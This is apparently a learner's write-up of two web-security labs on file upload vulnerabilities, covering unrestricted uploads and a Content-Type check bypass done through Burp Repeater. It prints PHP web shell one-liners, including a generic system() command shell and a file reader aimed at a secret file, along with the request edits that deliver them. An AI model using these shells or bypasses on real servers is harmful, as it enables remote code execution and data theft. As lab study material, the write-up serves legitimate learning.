# What are file upload vulnerabilities?
  File upload vulnerabilities are when a web server allows users to upload files to its filesystem without sufficiently validating things like their name, type, contents, or size. Failing to properly enforce restrictions on these could mean that even a basic image upload function can be used to upload arbitrary and potentially dangerous files instead. This could even include server-side script files that enable remote code execution.

# How do file upload vulnerabilities arise?
Commonly, developers implement what they believe to be robust validation that is either inherently flawed or can be easily bypassed.<br>
They may attempt to blacklist dangerous file types, but fail to account for parsing discrepancies when checking the file extensions. As with any blacklist, it's also easy to accidentally omit more obscure file types that may still be dangerous.

## Exploiting unrestricted file uploads to deploy a web shell
The worst possible scenario is when a website allows you to upload server-side scripts, such as PHP, Java, or Python files, and is also configured to execute them as code. This makes it trivial to create your own web shell on the server.
```
A web shell is a malicious script that enables an attacker to execute arbitrary commands on a remote web server simply by
sending HTTP requests to the right endpoint.
```
> If you're able to successfully upload a web shell, you effectively have full control over the server. This means you can read and write arbitrary files, exfiltrate sensitive data, even use the server to pivot attacks against both internal infrastructure and other servers outside the network.

***For example:***
- The following PHP one-liner could be used to read arbitrary files from the server's filesystem:
  
  ```
  <?php echo file_get_contents('/path/to/target/file'); ?>
  ```
- A more versatile web shell may look something like this:

  ```
  <?php echo system($_GET['command']); ?>
  ```
  > This script enables you to pass an arbitrary system command via a query parameter
  
# Lab-1: Remote code execution via web shell upload 
> This lab contains a vulnerable image upload function. It doesn't perform any validation on the files users upload before storing them on the server's filesystem.<br>
To solve the lab, upload a basic PHP web shell and use it to exfiltrate the contents of the file ``` /home/carlos/secret ```. Submit this secret using the button provided in the lab banner.<br>
You can log in to your own account using the following credentials: ``` wiener:peter ```.

## Solution:
- Access the lab and got usual dashboard.

   <img width="1902" height="1090" alt="image" src="https://github.com/user-attachments/assets/5652e334-1a27-4401-9d85-6e15a82d9dde" />

- Logged in using given credentials and got to a place to upload a file.

   <img width="1902" height="1092" alt="image" src="https://github.com/user-attachments/assets/29c09ccb-425b-48ed-9104-3d98a945ec43" />

- Uploaded a random screenshot, it displayed a preview of that screenshot in the avatar space.

   <img width="1902" height="1091" alt="image" src="https://github.com/user-attachments/assets/471b5a27-24d4-4b3d-9d08-1647cd8d962c" />

- Opened Burp and found for ``` avatar ``` request and got these 2, one POST and one GET request.

   <img width="1918" height="1199" alt="Screenshot 2025-12-31 151454" src="https://github.com/user-attachments/assets/1e60e503-44be-4b6e-9938-a488d21e3237" />

- Sent it to Repeater, got the complete ``` image/png ``` data i.e. ``` hexdump ```.
- Down below I changed the filename to a ``` .php ``` webshell name -> ``` exploit.php ```.
- Deleted the complete ``` image/png ``` hexdump and wrote the php webshell in place of that to extract contents from the given path -> ``` /home/carlos/secret ```.
  ```
  <?php echo file_get_contents('/home/carlos/secret'); ?>
  ```
- Sent this modified request to the server and gave response as ``` exploit.php file has been uploaded ```.

   <img width="1919" height="1199" alt="Screenshot 2025-12-31 151430" src="https://github.com/user-attachments/assets/0daa5b43-2868-43c1-8910-047fcf370d10" />

- Opened the GET request and changed the path to ``` /files/avatar/exploit.php ``` and sent the request to the server and got this response.

    <img width="1919" height="1199" alt="Screenshot 2025-12-31 151417" src="https://github.com/user-attachments/assets/f7946149-c437-4a29-9681-c98256d241cc" />

- Submitted the content -> ``` SuUfB4TL17LIm0hNIHlkGvqjHbl7qCoF ``` and completed the lab.

   <img width="1919" height="1198" alt="Screenshot 2025-12-31 151406" src="https://github.com/user-attachments/assets/cd3b88d8-cedc-41a9-b839-4da85ac8357e" />

## Concepts Learnerd:
- Learned about php webhell used to exfiltrate contents from a given path.
- Learned about how to deal with file upload vulnerability.

# Exploiting flawed validation of file uploads
It's unlikely that you'll find a website that has no protection against file upload attacks.<br>
But just because defenses are in place, that doesn't mean that they're robust. You can sometimes still exploit flaws in these mechanisms to obtain a web shell for remote code execution.

# Flawed file type validation
When submitting HTML forms, the browser typically sends the provided data in a POST request with the content type ``` application/x-www-form-urlencoded ```. This is fine for sending simple text like your name or address.<br>
However, it isn't suitable for sending large amounts of binary data, such as an entire image file or a PDF document. In this case, the content type ``` multipart/form-data ``` is preferred.
***For example:***
Consider a form containing fields for uploading an image, providing a description of it, and entering your username.<br>
Submitting such a form might result in a request that looks something like this:
```
POST /images HTTP/1.1
    Host: normal-website.com
    Content-Length: 12345
    Content-Type: multipart/form-data; boundary=---------------------------012345678901234567890123456

    ---------------------------012345678901234567890123456
    Content-Disposition: form-data; name="image"; filename="example.jpg"
    Content-Type: image/jpeg

    [...binary content of example.jpg...]

    ---------------------------012345678901234567890123456
    Content-Disposition: form-data; name="description"

    This is an interesting description of my image.

    ---------------------------012345678901234567890123456
    Content-Disposition: form-data; name="username"

    wiener
    ---------------------------012345678901234567890123456--
```
One way that websites may attempt to validate file uploads is to check that this input-specific ``` Content-Type ``` header matches an expected MIME type.<br>
If the server is only expecting image files, for example, it may only allow types like ``` image/jpeg ``` and ``` image/png ```.

# Lab-2: Web shell upload via Content-Type restriction bypass
> This lab contains a vulnerable image upload function. It attempts to prevent users from uploading unexpected file types, but relies on checking user-controllable input to verify this.
To solve the lab, upload a basic PHP web shell and use it to exfiltrate the contents of the file ``` /home/carlos/secret ```. Submit this secret using the button provided in the lab banner.
You can log in to your own account using the following credentials: ``` wiener:peter ```

## Solution:
- Accessed the lab and got usual dashboard.

   <img width="1903" height="1090" alt="Screenshot 2026-01-03 113144" src="https://github.com/user-attachments/assets/5023a382-3f3b-4ec9-938b-688599fbe386" />

- Went to ``` My Account ``` and logged in.
- Uploaded a random text file, it says that only ``` image/jpeg ``` or ``` image/png ``` allowed.
- Then uploaded a random screenshot and got a preview of that image like in the previous lab.
- Opened Burp and got 2 same type of requests, one POST and one GET request for uploading the screenshot.
- Changed the ``` filename ``` -> ``` exploit.php ``` and deleted the image data and wrote a ``` php webshell ``` to extract the contents from the given path.
  ```
  <?php echo file_get_contents('/home/carlos/secret'); ?>
  ```
- Sent the request but response was of not much use.

   <img width="1919" height="1199" alt="Screenshot 2025-12-31 161516" src="https://github.com/user-attachments/assets/58b4fef5-5f46-4735-91ca-8e5aa29cb187" />

- Then I tried to change the ``` Content-Type ``` header to ``` image/png ``` as lab says it has image upload vulnerability and it allows only jpeg/png to be uploaded.

  <img width="1919" height="1199" alt="Screenshot 2025-12-31 161537" src="https://github.com/user-attachments/assets/fca93a58-abab-41b8-a2f1-918ad0936cac" />

- Sent the request to the server and got the contents.

   <img width="1919" height="1199" alt="Screenshot 2025-12-31 161442" src="https://github.com/user-attachments/assets/8f67adcd-4ca4-47be-9d42-1379da36d00c" />

- Submitted the content and completed the lab.

## Concepts Learned:
- How to deal with image upload vulnerabilities.
- Manipulating server to believe that the uploaded thing is what it wants but it isn't, by changing the ``` Content-Type ``` header.
  



   




























